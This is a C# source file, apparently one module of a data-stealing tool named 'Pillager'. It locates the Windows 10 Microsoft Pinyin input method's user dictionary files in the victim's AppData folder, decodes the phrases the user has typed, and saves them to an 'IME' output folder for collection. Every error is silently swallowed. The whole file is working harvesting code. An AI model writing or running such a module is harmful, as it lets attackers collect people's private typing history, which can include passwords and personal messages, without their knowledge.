using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Pillager.Helper;

namespace Pillager.IMEs
{
    internal class Win10Ms_Pinyin:ICommand
    {
        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                byte[] bytes = File.ReadAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\InputMethod\\Chs\\ChsPinyinIH.dat"));
                bytes = bytes.Skip(5120).Take(bytes.Length - 5120).ToArray();
                int i = 1;
                while (true)
                {
                    try
                    {
                        byte[] temp = bytes.Skip((60 * i) + 12).Take(2 * bytes[60 * i]).ToArray();
                        string output = Encoding.Unicode.GetString(temp);
                        sb.AppendLine(output);
                        i++;
                        if (60 * i > bytes.Length) break;
                    }
                    catch { break; }
                }
            }
            catch {}

            try
            {
                byte[] bytes2 = File.ReadAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\InputMethod\\Chs\\ChsPinyinUDL.dat"));
                bytes2 = bytes2.Skip(9216).Take(bytes2.Length - 9216).ToArray();
                int j = 1;
                while (true)
                {
                    try
                    {
                        byte[] temp = bytes2.Skip((60 * j) + 12).Take(2 * bytes2[(60 * j) + 10]).ToArray();
                        sb.AppendLine(Encoding.Unicode.GetString(temp));
                        j++;
                        if (60 * j > bytes2.Length) break;
                    }
                    catch { break; }
                }
            }
            catch { }

            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, "IME");
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "Win10Ms_Pinyin.txt"), output, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
